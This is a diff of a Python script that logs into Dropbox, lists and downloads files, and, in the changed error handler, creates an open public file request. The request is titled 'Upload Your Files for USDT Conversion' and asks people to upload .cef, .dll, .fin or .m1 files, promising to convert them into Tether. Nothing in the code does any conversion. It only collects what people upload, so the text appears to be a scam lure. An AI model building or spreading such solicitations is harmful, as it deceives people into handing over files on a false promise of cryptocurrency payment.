@@ -1,5 +1,5 @@
-import sys
 import io
+import sys
 import dropbox
 from dropbox.exceptions import AuthError, ApiError
 from dotenv import load_dotenv
@@ -36,6 +36,7 @@ def handle_signal(signum, frame):
     """Handle termination signals gracefully."""
     print("")
     print(f"\n> {RED}! [SIGNUM:{signum}] Terminating gracefully...{NC}")
+    print("")
     sys.stdout.flush()
     sys.exit(1)
 
@@ -56,11 +57,11 @@ def network_check(func):
                     # Check network connectivity
                     response = requests.get("https://google.com", timeout=10)
                     response.raise_for_status()
-                    if not network_good:
-                        print("")
-                        print(f"{GREEN}[OK] Network connectivity is good.{NC}")
-                        sys.stdout.flush()
-                        network_good = True
+                    # if not network_good:
+                    #     print("")
+                    #     print(f"{GREEN}[OK] Network connectivity is good.{NC}")
+                    #     sys.stdout.flush()
+                    #     network_good = True
                     # Network is good, proceed with the function
                     return func(*args, **kwargs)
                 except (requests.exceptions.RequestException, requests.exceptions.ConnectTimeout) as e:
@@ -119,7 +120,8 @@ def connect_to_dropbox():
     try:
         dbx = dropbox.Dropbox(ACCESS_TOKEN)
         dbx.users_get_current_account()
-        print(f"{GREEN}[OK] Dropbox connection established.{NC}")
+        # print("")
+        # print(f"{GREEN}[OK] Dropbox connection established.{NC}")
         sys.stdout.flush()
         print("")
         return dbx
@@ -186,31 +188,28 @@ def list_files_and_download():
                 print(f"{YELLOW}[OK] {selected_file.name} is now selected.{NC}")
                 sys.stdout.flush()
 
-        else:
-            print(f"{RED}[X] No files found in the target folder. Creating a file request URL...{NC}")
-            sys.stdout.flush()
-            print("")
-            # Create a file request URL
-            title = "Upload Your Files for USDT Conversion"
-            description = (
-                "Please upload your files with the following extensions: .cef, .dll, .fin, or .m1 to this Dropbox folder. "
-                "Our system will process and convert the eligible files into USDT (Tether) and notify you once the conversion is complete. "
-                "Ensure that you upload only the required file types to avoid any processing delays. Thank you for using our service!"
-            )
-
-            # Create file request in Dropbox
-            file_request = dbx.file_requests_create(title=title, destination=f"/{TARGET_FOLDER}/FileRequests", open=True, description=description)
-            file_request_url = file_request.url
-            print(f"{GREEN}[OK] File request URL: {file_request_url}{NC}")
-            sys.stdout.flush()
-            print("")
-            print(f"{YELLOW}[OK] Exiting...{NC}")
-            sys.stdout.flush()
     
     except dropbox.exceptions.ApiError as err:
-        print(f"{RED}[X] API error: {err}{NC}")
+        print(f"{RED}[X] No files found in the target folder. Creating a file request URL...{NC}")
         sys.stdout.flush()
         print("")
+        # Create a file request URL
+        title = "Upload Your Files for USDT Conversion"
+        description = (
+            "Please upload your files with the following extensions: .cef, .dll, .fin, or .m1 to this Dropbox folder. "
+            "Our system will process and convert the eligible files into USDT (Tether) and notify you once the conversion is complete. "
+            "Ensure that you upload only the required file types to avoid any processing delays. Thank you for using our service!"
+        )
+
+        # Create file request in Dropbox
+        file_request = dbx.file_requests_create(title=title, destination=f"/{TARGET_FOLDER}/FileRequests", open=True, description=description)
+        file_request_url = file_request.url
+        print(f"{GREEN}[OK] Kindly visit the following link to upload files to Dropbox.File request URL: {file_request_url}{NC}")
+        sys.stdout.flush()
+        print("")
+        print(f"{YELLOW}[OK] Exiting...{NC}")
+        print("")
+        sys.stdout.flush()
     except dropbox.exceptions.HttpError as err:
         print(f"{RED}[X] HTTP error: {err}{NC}")
         sys.stdout.flush()
